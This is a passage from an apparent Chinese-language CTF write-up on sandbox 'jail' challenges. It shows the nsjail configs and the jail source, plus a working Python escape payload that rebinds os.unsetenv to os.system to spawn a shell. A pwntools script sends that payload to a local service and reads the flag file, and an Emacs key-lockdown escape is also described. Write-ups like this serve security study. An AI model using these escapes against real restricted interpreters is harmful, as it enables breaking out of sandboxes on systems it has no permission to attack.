class=o>&gt;&gt;=</span> <span class=n>hGetContents</span> <span class=o>&gt;&gt;=</span> <span class=n>putStr</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=jailprismatic>jail/prismatic</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>docker build -t prismatic:latest .
</span></span><span class=line><span class=cl>docker run -d -p 1337:1337 --name prismatic_container prismatic:latest
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=c1># Copyright 2020 Google LLC</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># Licensed under the Apache License, Version 2.0 (the &#34;License&#34;);</span>
</span></span><span class=line><span class=cl><span class=c1># you may not use this file except in compliance with the License.</span>
</span></span><span class=line><span class=cl><span class=c1># You may obtain a copy of the License at</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1>#     https://www.apache.org/licenses/LICENSE-2.0</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># Unless required by applicable law or agreed to in writing, software</span>
</span></span><span class=line><span class=cl><span class=c1># distributed under the License is distributed on an &#34;AS IS&#34; BASIS,</span>
</span></span><span class=line><span class=cl><span class=c1># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span>
</span></span><span class=line><span class=cl><span class=c1># See the License for the specific language governing permissions and</span>
</span></span><span class=line><span class=cl><span class=c1># limitations under the License.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># See options available at https://github.com/google/nsjail/blob/master/config.proto</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>name</span><span class=p>:</span> <span class=s2>&#34;default-nsjail-configuration&#34;</span>
</span></span><span class=line><span class=cl><span class=n>description</span><span class=p>:</span> <span class=s2>&#34;Default nsjail configuration for pwnable-style CTF task.&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>mode</span><span class=p>:</span> <span class=n>ONCE</span>
</span></span><span class=line><span class=cl><span class=n>uidmap</span> <span class=p>{</span><span class=n>inside_id</span><span class=p>:</span> <span class=s2>&#34;1000&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>gidmap</span> <span class=p>{</span><span class=n>inside_id</span><span class=p>:</span> <span class=s2>&#34;1000&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>rlimit_as</span><span class=p>:</span> <span class=mi>10</span>
</span></span><span class=line><span class=cl><span class=n>rlimit_as_type</span><span class=p>:</span> <span class=n>HARD</span>
</span></span><span class=line><span class=cl><span class=n>rlimit_cpu</span><span class=p>:</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl><span class=n>rlimit_cpu_type</span><span class=p>:</span> <span class=n>HARD</span>
</span></span><span class=line><span class=cl><span class=n>rlimit_nofile_type</span><span class=p>:</span> <span class=n>HARD</span>
</span></span><span class=line><span class=cl><span class=n>rlimit_nproc</span><span class=p>:</span> <span class=mi>10</span>
</span></span><span class=line><span class=cl><span class=n>rlimit_nproc_type</span><span class=p>:</span> <span class=n>HARD</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>envar</span><span class=p>:</span> <span class=s2>&#34;TERM=xterm-256color&#34;</span>
</span></span><span class=line><span class=cl><span class=n>time_limit</span><span class=p>:</span> <span class=mi>60</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>mount</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>src</span><span class=p>:</span> <span class=s2>&#34;/chroot&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>dst</span><span class=p>:</span> <span class=s2>&#34;/&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>is_bind</span><span class=p>:</span> <span class=bp>true</span>
</span></span><span class=line><span class=cl>  <span class=p>},</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>src</span><span class=p>:</span> <span class=s2>&#34;/dev&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>dst</span><span class=p>:</span> <span class=s2>&#34;/dev&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>is_bind</span><span class=p>:</span> <span class=bp>true</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span></code></pre></td></tr></table></div></div><p>对靶机环境进行权限限制之类的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/local/bin/python3</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>allowed_chars</span> <span class=o>=</span> <span class=n>string</span><span class=o>.</span><span class=n>ascii_lowercase</span> <span class=o>+</span> <span class=s2>&#34;.[]; &#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>inp</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s2>&#34;&gt; &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>inp</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=n>c</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>allowed_chars</span><span class=p>:</span>
</span></span><span class=line><span class=cl>		<span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Illegal char </span><span class=si>{</span><span class=n>c</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sys</span><span class=o>.</span><span class=n>stdin</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>sys</span><span class=o>.</span><span class=n>stdout</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>sys</span><span class=o>.</span><span class=n>stderr</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>exec</span><span class=p>(</span><span class=n>inp</span><span class=p>,</span> <span class=p>{</span><span class=s2>&#34;__builtins__&#34;</span><span class=p>:</span> <span class=p>{</span><span class=n>k</span><span class=p>:</span> <span class=n>v</span> <span class=k>for</span> <span class=n>k</span><span class=p>,</span> <span class=n>v</span> <span class=ow>in</span> <span class=n>__builtins__</span><span class=o>.</span><span class=vm>__dict__</span><span class=o>.</span><span class=n>items</span><span class=p>()</span> <span class=k>if</span> <span class=s2>&#34;__&#34;</span> <span class=ow>in</span> <span class=n>k</span><span class=p>}})</span>
</span></span></code></pre></td></tr></table></div></div><p>只允许使用小写字母、点、方括号、分号和空格，其实比较重要的是最后一句，ta只保留了包含双下划线的内置函数，像<code>print\open</code>这类的都不可以使用，其实这个黑名单过滤并不严格，小写字母都是够够的，只不过没有引号了，<code>sys.executable</code>是python解释器，利用函数替换</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span><span class=p>;</span><span class=kn>import</span> <span class=nn>sys</span><span class=p>;[</span><span class=n>os</span> <span class=k>for</span> <span class=n>os</span><span class=o>.</span><span class=n>unsetenv</span> <span class=ow>in</span> <span class=p>[</span><span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>]];</span><span class=k>del</span> <span class=n>os</span><span class=o>.</span><span class=n>environ</span><span class=p>[</span><span class=n>sys</span><span class=o>.</span><span class=n>executable</span><span class=p>]</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;localhost&#34;</span><span class=p>,</span> <span class=mi>1337</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span>
</span></span><span class=line><span class=cl>	<span class=sa>b</span><span class=s2>&#34;&gt; &#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=sa>b</span><span class=s2>&#34;import os;import sys;[os for os.unsetenv in [os.system]];del os.environ[sys.executable]&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt;&gt;&gt; &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;print(open(&#39;/app/flag.txt&#39;).read())&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>s</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>])</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=jailemacs-jail>jail/emacs-jail</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=c1># Copyright 2020 Google LLC</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># Licensed under the Apache License, Version 2.0 (the &#34;License&#34;);</span>
</span></span><span class=line><span class=cl><span class=c1># you may not use this file except in compliance with the License.</span>
</span></span><span class=line><span class=cl><span class=c1># You may obtain a copy of the License at</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1>#     https://www.apache.org/licenses/LICENSE-2.0</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># Unless required by applicable law or agreed to in writing, software</span>
</span></span><span class=line><span class=cl><span class=c1># distributed under the License is distributed on an &#34;AS IS&#34; BASIS,</span>
</span></span><span class=line><span class=cl><span class=c1># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span>
</span></span><span class=line><span class=cl><span class=c1># See the License for the specific language governing permissions and</span>
</span></span><span class=line><span class=cl><span class=c1># limitations under the License.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># See options available at https://github.com/google/nsjail/blob/master/config.proto</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>name</span><span class=p>:</span> <span class=s2>&#34;default-nsjail-configuration&#34;</span>
</span></span><span class=line><span class=cl><span class=n>description</span><span class=p>:</span> <span class=s2>&#34;Default nsjail configuration for pwnable-style CTF task.&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>mode</span><span class=p>:</span> <span class=n>ONCE</span>
</span></span><span class=line><span class=cl><span class=n>uidmap</span> <span class=p>{</span><span class=n>inside_id</span><span class=p>:</span> <span class=s2>&#34;1000&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>gidmap</span> <span class=p>{</span><span class=n>inside_id</span><span class=p>:</span> <span class=s2>&#34;1000&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>rlimit_as</span><span class=p>:</span> <span class=mi>134217728</span>
</span></span><span class=line><span class=cl><span class=n>rlimit_as_type</span><span class=p>:</span> <span class=n>HARD</span>
</span></span><span class=line><span class=cl><span class=n>rlimit_cpu_type</span><span class=p>:</span> <span class=n>HARD</span>
</span></span><span class=line><span class=cl><span class=n>rlimit_nofile_type</span><span class=p>:</span> <span class=n>HARD</span>
</span></span><span class=line><span class=cl><span class=n>rlimit_nproc_type</span><span class=p>:</span> <span class=n>HARD</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>envar</span><span class=p>:</span> <span class=s2>&#34;TERM=xterm-256color&#34;</span> 
</span></span><span class=line><span class=cl><span class=n>time_limit</span><span class=p>:</span> <span class=mi>300</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>mount</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>src</span><span class=p>:</span> <span class=s2>&#34;/chroot&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>dst</span><span class=p>:</span> <span class=s2>&#34;/&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>is_bind</span><span class=p>:</span> <span class=bp>true</span>
</span></span><span class=line><span class=cl>  <span class=p>},</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>src</span><span class=p>:</span> <span class=s2>&#34;/dev&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>dst</span><span class=p>:</span> <span class=s2>&#34;/dev&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>is_bind</span><span class=p>:</span> <span class=bp>true</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span></code></pre></td></tr></table></div></div><p>限制权限并且限制程序最多允许运行 300 秒（5 分钟）。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-elm data-lang=elm><span class=line><span class=cl><span class=p>(</span><span class=nv>defun</span> <span class=nv>x</span> <span class=p>()</span> <span class=p>(</span><span class=nv>mapc</span> <span class=p>(</span><span class=nv>lambda</span> <span class=p>(</span><span class=nv>key</span><span class=p>)</span> <span class=p>(</span><span class=nv>unless</span> <span class=p>(</span><span class=nv>eq</span> <span class=nv>key</span> <span class=mi>13</span><span class=p>)</span> <span class=p>(</span><span class=nv>local</span><span class=nf>-</span><span class=nv>set</span><span class=nf>-</span><span class=nv>key</span> <span class=p>(</span><span class=nv>vector</span> <span class=nv>key</span><span class=p>)</span> <span class=nf>&#39;</span><span class=nv>ignore</span><span class=p>)))</span> <span class=p>(</span><span class=nv>number</span><span class=nf>-</span><span class=nv>sequence</span> <span class=mi>0</span> <span class=mi>255</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nv>add</span><span class=nf>-</span><span class=nv>hook</span> <span class=nf>&#39;</span><span class=nv>minibuffer</span><span class=nf>-</span><span class=nv>setup</span><span class=nf>-</span><span class=nv>hook</span> <span class=nf>&#39;</span><span class=nv>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nv>setq</span> <span class=nv>inhibit</span><span class=nf>-</span><span class=nv>local</span><span class=nf>-</span><span class=nv>menu</span><span class=nf>-</span><span class=nv>bar</span><span class=nf>-</span><span class=nv>menus</span> <span class=nv>t</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nv>setq</span> <span class=nv>warning</span><span class=nf>-</span><span class=nv>minimum</span><span class=nf>-</span><span class=nv>level</span> <span class=nf>:</span><span class=nv>error</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nv>dotimes</span> <span class=p>(</span><span class=nv>i</span> <span class=mi>12</span><span class=p>)</span> <span class=p>(</span><span class=nv>global</span><span class=nf>-</span><span class=nv>unset</span><span class=nf>-</span><span class=nv>key</span> <span class=p>(</span><span class=nv>vector</span> <span class=p>(</span><span class=nv>intern</span> <span class=p>(</span><span class=nv>format</span> <span class=s>&#34;f%d&#34;</span> <span class=p>(</span><span class=mi>1</span><span class=nf>+</span> <span class=nv>i</span><span class=p>))))))</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nv>define</span><span class=nf>-</span><span class=nv>key</span> <span class=nv>key</span><span class=nf>-</span><span class=nv>translation</span><span class=nf>-</span><span class=nv>map</span> <span class=p>(</span><span class=nv>kbd</span> <span class=s>&#34;C-M-x&#34;</span><span class=p>)</span> <span class=p>(</span><span class=nv>kbd</span> <span class=s>&#34;&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nv>define</span><span class=nf>-</span><span class=nv>key</span> <span class=nv>key</span><span class=nf>-</span><span class=nv>translation</span><span class=nf>-</span><span class=nv>map</span> <span class=p>(</span><span class=nv>kbd</span> <span class=s>&#34;C-j&#34;</span><span class=p>)</span> <span class=p>(</span><span class=nv>kbd</span> <span class=s>&#34;&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nv>define</span><span class=nf>-</span><span class=nv>key</span> <span class=nv>input</span><span class=nf>-</span><span class=nv>decode</span><span class=nf>-</span><span class=nv>map</span> <span class=p>(</span><span class=nv>kbd</span> <span class=s>&#34;C-i&#34;</span><span class=p>)</span> <span class=p>[</span><span class=nv>ignore</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nv>define</span><span class=nf>-</span><span class=nv>key</span> <span class=nv>input</span><span class=nf>-</span><span class=nv>decode</span><span class=nf>-</span><span class=nv>map</span> <span class=p>(</span><span class=nv>kbd</span> <span class=s>&#34;TAB&#34;</span><span class=p>)</span> <span class=p>[</span><span class=nv>ignore</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nv>global</span><span class=nf>-</span><span class=nv>unset</span><span class=nf>-</span><span class=nv>key</span> <span class=p>(</span><span class=nv>kbd</span> <span class=s>&#34;C-</span><span class=se>\\</span><span class=s>&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nv>global</span><span class=nf>-</span><span class=nv>unset</span><span class=nf>-</span><span class=nv>key</span> <span class=p>(</span><span class=nv>kbd</span> <span class=s>&#34;C-k&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nv>global</span><span class=nf>-</span><span class=nv>unset</span><span class=nf>-</span><span class=nv>key</span> <span class=p>(</span><span class=nv>kbd</span> <span class=s>&#34;C-h&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nv>global</span><span class=nf>-</span><span class=nv>unset</span><span class=nf>-</span><span class=nv>key</span> <span class=p>(</span><span class=nv>kbd</span> <span class=s>&#34;C-g&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nv>global</span><span class=nf>-</span><span class=nv>unset</span><span class=nf>-</span><span class=nv>key</span> <span class=p>(</span><span class=nv>kbd</span> <span class=s>&#34;C-u&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nv>global</span><span class=nf>-</span><span class=nv>unset</span><span class=nf>-</span><span class=nv>key</span> <span class=p>(</span><span class=nv>kbd</span> <span class=s>&#34;C-x&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nv>global</span><span class=nf>-</span><span class=nv>unset</span><span class=nf>-</span><span class=nv>key</span> <span class=p>(</span><span class=nv>kbd</span> <span class=s>&#34;C-z&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nv>global</span><span class=nf>-</span><span class=nv>unset</span><span class=nf>-</span><span class=nv>key</span> <span class=p>(</span><span class=nv>kbd</span> <span class=s>&#34;M-.&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nv>global</span><span class=nf>-</span><span class=nv>unset</span><span class=nf>-</span><span class=nv>key</span> <span class=p>(</span><span class=nv>kbd</span> <span class=s>&#34;M-%&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nv>global</span><span class=nf>-</span><span class=nv>unset</span><span class=nf>-</span><span class=nv>key</span> <span class=p>(</span><span class=nv>kbd</span> <span class=s>&#34;M-n&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nv>global</span><span class=nf>-</span><span class=nv>unset</span><span class=nf>-</span><span class=nv>key</span> <span class=p>(</span><span class=nv>kbd</span> <span class=s>&#34;M-x&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nv>global</span><span class=nf>-</span><span class=nv>unset</span><span class=nf>-</span><span class=nv>key</span> <span class=p>(</span><span class=nv>kbd</span> <span class=s>&#34;M-0&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nv>global</span><span class=nf>-</span><span class=nv>unset</span><span class=nf>-</span><span class=nv>key</span> <span class=p>(</span><span class=nv>kbd</span> <span class=s>&#34;M-!&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nv>global</span><span class=nf>-</span><span class=nv>unset</span><span class=nf>-</span><span class=nv>key</span> <span class=p>(</span><span class=nv>kbd</span> <span class=s>&#34;M-:&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nv>global</span><span class=nf>-</span><span class=nv>unset</span><span class=nf>-</span><span class=nv>key</span> <span class=p>(</span><span class=nv>kbd</span> <span class=s>&#34;M-`&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nv>global</span><span class=nf>-</span><span class=nv>unset</span><span class=nf>-</span><span class=nv>key</span> <span class=p>(</span><span class=nv>kbd</span> <span class=s>&#34;M-&amp;&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nv>global</span><span class=nf>-</span><span class=nv>unset</span><span class=nf>-</span><span class=nv>key</span> <span class=p>(</span><span class=nv>kbd</span> <span class=s>&#34;M-|&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nv>global</span><span class=nf>-</span><span class=nv>unset</span><span class=nf>-</span><span class=nv>key</span> <span class=p>(</span><span class=nv>kbd</span> <span class=s>&#34;M-?&#34;</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p>直接按下键盘上的 q 键然后<code>Enter</code>，就会到测试区域，</p><p><img src=/p/b01lersctf2025/QQ20250429-142506.jpg width=906 height=535 loading=lazy alt=1></p><p>在出现的<code>scratch</code>缓冲区中，输入以下内容<code>(kill-emacs)</code>，按住<code>Crtl+c</code>再按<code>Crtl+e</code>，就可以把flag爆出来，但是我并没有成功emm，不过确实是合理的</p><h2 id=jailmonochromatic>jail/monochromatic</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/local/bin/python3</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>dis</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>gc</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>run</span><span class=p>():</span>
</span></span><span class=line><span class=cl>	<span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gc</span><span class=o>.</span><span class=n>disable</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>inp</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=nb>input</span><span class=p>(</span><span class=s2>&#34;Bytecode: &#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>names</span> <span class=o>=</span> <span class=nb>tuple</span><span class=p>(</span><span class=nb>input</span><span class=p>(</span><span class=s2>&#34;Names: &#34;</span><span class=p>)</span><span class=o>.</span><span class=n>split</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>inp</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>200</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Invalid bytecode </span><span class=si>{</span><span class=n>inp</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>exit</span><span class=p>()</span>
